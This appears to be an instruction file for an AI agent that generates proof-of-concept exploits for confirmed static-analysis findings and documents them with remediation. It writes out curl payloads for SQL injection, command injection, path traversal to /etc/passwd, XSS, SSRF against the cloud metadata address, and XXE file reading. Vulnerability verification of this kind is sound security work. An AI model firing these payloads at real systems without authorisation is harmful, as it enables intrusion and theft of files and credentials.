# Skill: Generate PoC

Generate a proof-of-concept exploit for a confirmed true positive vulnerability.

## Prerequisites

- A finding classified as TRUE POSITIVE (analyze-findings skill)
- SARIF trace read and understood

## Procedure

### 1. Extract vulnerability trace from SARIF

- **Source**: Entry point + parameter (`codeFlows[0].threadFlows[0].locations[0]`)
- **Path**: Intermediate method calls
- **Sink**: Dangerous operation (`codeFlows[0].threadFlows[0].locations[-1]`)

### 2. Construct PoC by vulnerability type

**SQL Injection**: Input that extracts data or bypasses auth
```bash
curl "http://target:8080/api/users?id=1' OR '1'='1"
```

**Command Injection**: Input that executes arbitrary commands
```bash
curl "http://target:8080/api/process?cmd=;cat /etc/passwd"
```

**Path Traversal**: Input that accesses unauthorized files
```bash
curl "http://target:8080/api/files?path=../../../etc/passwd"
```

**XSS**: Input that executes JavaScript
```bash
curl "http://target:8080/api/search?q=<script>alert(1)</script>"
```

**SSRF**: Input that makes the server request internal resources
```bash
curl "http://target:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**XXE**: XML input that reads files
```bash
curl -X POST "http://target:8080/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### 3. Document the finding

```markdown
## VULN-001: SQL Injection in UserController.getUser

**Severity**: Critical (CWE-89)
**Location**: `src/main/java/com/example/controller/UserController.java:45`
**Rule**: `my-vulnerability`

### Description
User-controlled input from HTTP parameter `id` flows unsanitized into
a SQL query via `Statement.executeQuery()`.

### Trace
1. **Source**: `UserController.getUser()` -- `request.getParameter("id")` (line 42)
2. **Flow**: String concatenation `"SELECT * FROM users WHERE id = " + input` (line 44)
3. **Sink**: `Statement.executeQuery(query)` (line 45)

### Proof of Concept
\```
curl "http://target:8080/api/users/1' OR '1'='1"
\```

### Remediation
Use parameterized queries:
\```java
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
pstmt.setString(1, input);
\```
```

Write to `vulnerabilities.md` in the working directory.
